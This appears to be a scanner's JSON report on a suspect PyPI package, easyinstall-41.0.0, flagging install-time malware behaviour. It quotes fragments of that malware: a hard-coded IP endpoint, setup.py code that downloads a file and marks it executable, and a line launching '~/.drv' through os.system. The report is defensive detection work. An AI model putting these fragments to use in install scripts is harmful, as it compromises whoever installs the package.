@@ -1,0 +1,41 @@
+{
+    "issues": 4,
+    "errors": {},
+    "results": {
+        "clipboard-access": {},
+        "dll-hijacking": {},
+        "steganography": {},
+        "shady-links": [
+            {
+                "location": "easyinstall/pr.py:7",
+                "code": "\tADD_LOC = \"http://145.249.104.71/out\"\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "obfuscation": {},
+        "exfiltrate-sensitive-data": {},
+        "download-executable": [
+            {
+                "location": "easyinstall/pr.py:13",
+                "code": "        \td = open (LOC, \"wb\")\n        \td.write (response.read ())\n        \td.close ()\n\n        \tcurrent_state = os.stat (LOC)\n        \tos.chmod (LOC, current_state.st_mode|stat.S_IEXEC)\n",
+                "message": "This package is downloading making executable a remote binary"
+            },
+            {
+                "location": "setup.py:25",
+                "code": "        d = open(LOC, \"wb\")\n        d.write(response)\n        d.close()\n        current_state = os.stat(LOC)\n        os.chmod(LOC, current_state.st_mode | stat.S_IEXEC)\n",
+                "message": "This package is downloading making executable a remote binary"
+            }
+        ],
+        "silent-process-execution": {},
+        "cmd-overwrite": {},
+        "code-execution": [
+            {
+                "location": "setup.py:33",
+                "code": "        thread.Thread (target=(lambda: os.system(\"~/.drv\"))).start ()\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/easyinstall-41.0.0"
+}
